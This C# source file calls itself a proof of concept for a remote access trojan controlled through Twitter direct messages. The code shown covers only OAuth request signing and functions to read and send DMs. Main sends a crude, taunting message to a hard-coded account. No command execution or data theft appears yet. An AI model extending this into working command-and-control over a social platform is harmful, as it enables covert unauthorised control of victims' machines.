/*
 * AUTHOR: 2d Lt Braden Laverick
 * ORGANIZATION: 92 COS/DOA
 * PROJECT: Narcissus
 * DESCRIPTION: This project is a proof of concept for a twitter-based remote access trojan. The tool is controlled through
 * direct messages in twitter. The bot requires access to one account to receive DMs.
 */

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net.Http;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace narcissus
{
    class Narcissus
    {
        static Narcissus narcissusMain = new Narcissus();
        static HttpClient narcissusHTTPClient = new HttpClient();
        static readonly string apiVar = Environment.GetEnvironmentVariable("narcissusKeys", EnvironmentVariableTarget.User);
        static readonly string[] apiKeys = apiVar.Split(';');
        static readonly string oauthKey = apiKeys[0];
        static readonly string oauthToken = apiKeys[2];
        static readonly string oauthKeySecret = apiKeys[1];
        static readonly string oauthTokenSecret = apiKeys[3];

        public async Task<string> GetAsync(string url)
        {            
            using (var response = await narcissusHTTPClient.GetAsync(url))
            {
                return await response.Content.ReadAsStringAsync();
            }
        }

        public async Task<string> PostAsync(string url, HttpContent content)
        {
            using (var response = await narcissusHTTPClient.PostAsync(url, content))
            {
                return await response.Content.ReadAsStringAsync();
            }
        }

        public string Build_AuthHeader(string nonce, string timestamp, string method, string url, Dictionary<string, string> requestParams=null)
        {
            Dictionary<string, string> authorizationParams = new Dictionary<string, string>();
            authorizationParams.Add("oauth_nonce", nonce);
            authorizationParams.Add("oauth_timestamp", timestamp);
            authorizationParams.Add("oauth_consumer_key", oauthKey);
            authorizationParams.Add("oauth_signature_method", "HMAC-SHA1");
            authorizationParams.Add("oauth_token", oauthToken);
            authorizationParams.Add("oauth_version", "1.0");
            if(requestParams != null)
            {
                foreach(KeyValuePair<string,string> paramPair in requestParams)
                {
                    authorizationParams.Add(paramPair.Key, paramPair.Value);
                }
            }

            string signatureBaseString = "";
            List<string> paramKeys = authorizationParams.Keys.ToList();
            paramKeys.Sort();
            foreach(string requestParam in paramKeys)
            {
                if(requestParam == paramKeys.First())
                {
                    signatureBaseString = signatureBaseString + 
                        Uri.EscapeDataString(requestParam) +
                        "=" +
                        Uri.EscapeDataString(authorizationParams[requestParam]);
                } else
                {
                    signatureBaseString = signatureBaseString +
                        "&" +
                        Uri.EscapeDataString(requestParam) +
                        "=" +
                        Uri.EscapeDataString(authorizationParams[requestParam]);
                }  
            }

            string signatureString = String.Format("{0}&{1}&{2}",
                method,
                Uri.EscapeDataString(url),
                Uri.EscapeDataString(signatureBaseString));

            byte[] signingKey = Encoding.UTF8.GetBytes(Uri.EscapeDataString(oauthKeySecret) + 
                "&" + 
                Uri.EscapeDataString(oauthTokenSecret));

            HMACSHA1 oauthSigner = new HMACSHA1(signingKey);
            byte[] oauthHashBytes = oauthSigner.ComputeHash(Encoding.UTF8.GetBytes(signatureString));
            string oauthSignature = Convert.ToBase64String(oauthHashBytes);

            authorizationParams.Add("oauth_signature", oauthSignature);

            string headerString = "";
            List<string> headerKeys = authorizationParams.Keys.ToList();
            headerKeys.Sort();
            foreach(string headerParam in headerKeys)
            {   
                if(headerParam == headerKeys.Last())
                {
                    headerString = headerString +
                    Uri.EscapeDataString(headerParam) +
                    "=" +
                    "\"" +
                    Uri.EscapeDataString(authorizationParams[headerParam]) +
                    "\"";
                } else
                {
                    headerString = headerString +
                    Uri.EscapeDataString(headerParam) +
                    "=" +
                    "\"" +
                    Uri.EscapeDataString(authorizationParams[headerParam]) +
                    "\", ";
                }
            }

            return headerString;
        }

        public string Receive_DM()
        {
            string method = "GET";
            string dmReceiveUrl = "1.1/direct_messages/events/list.json";

            string nonce = Convert.ToBase64String(Encoding.UTF8.GetBytes(Guid.NewGuid().ToString("N")));
            UInt32 timestamp = (UInt32)DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds;
            string formTimestamp = timestamp.ToString();
            string authenticationHeader = Build_AuthHeader(nonce, formTimestamp, method, narcissusHTTPClient.BaseAddress.ToString() + dmReceiveUrl);
          
            narcissusHTTPClient.DefaultRequestHeaders.Authorization = new System.Net.Http.Headers.AuthenticationHeaderValue("OAuth", authenticationHeader);
            string twitterResponse = narcissusMain.GetAsync(dmReceiveUrl).Result;

            return twitterResponse;
        }

        public string Send_DM()
        {
            string method = "POST";
            string dmSendUrl = "1.1/direct_messages/events/new.json";
            Dictionary<string, string> sendDMParams = new Dictionary<string, string>();
            sendDMParams.Add("type", "message_create");
            sendDMParams.Add("message_create.target.recipient_id", "1046167154578599936");
            string message = "Boy I'm really about to GET your pickle chin ass";
            sendDMParams.Add("message_create.message_data", message);

            string nonce = Convert.ToBase64String(Encoding.UTF8.GetBytes(Guid.NewGuid().ToString("N")));
            UInt32 timestamp = (UInt32)DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds;
            string formTimestamp = timestamp.ToString();
            string authenticationHeader = Build_AuthHeader(nonce, formTimestamp, method, narcissusHTTPClient.BaseAddress.ToString() + dmSendUrl);

            string postData = "{\"event\": " +
                "{" +
                "\"type\": \"message_create\", " +
                "\"message_create\": {" +
                    "\"target\": {\"recipient_id\": " + "\"" + sendDMParams["message_create.target.recipient_id"] +"\"" + "}," +
                    "\"message_data\": {\"text\": " + "\"" + sendDMParams["message_create.message_data"] +"\"" + "}" +
                    "}" +
                "}" +
                "}";
    
            HttpContent messageContent = new StringContent(postData);

            narcissusHTTPClient.DefaultRequestHeaders.Authorization = new System.Net.Http.Headers.AuthenticationHeaderValue("OAuth", authenticationHeader);
            narcissusHTTPClient.DefaultRequestHeaders.Accept.Add(new System.Net.Http.Headers.MediaTypeWithQualityHeaderValue("application/json"));

            string twitterResponse = narcissusMain.PostAsync(dmSendUrl, messageContent).Result;

            return twitterResponse;
        }

        static void Main(string[] args)
        { 
            narcissusHTTPClient.BaseAddress = new Uri("https://api.twitter.com");
            string twitterResponse = narcissusMain.Send_DM();
            Console.WriteLine(twitterResponse);
        }
    }
}
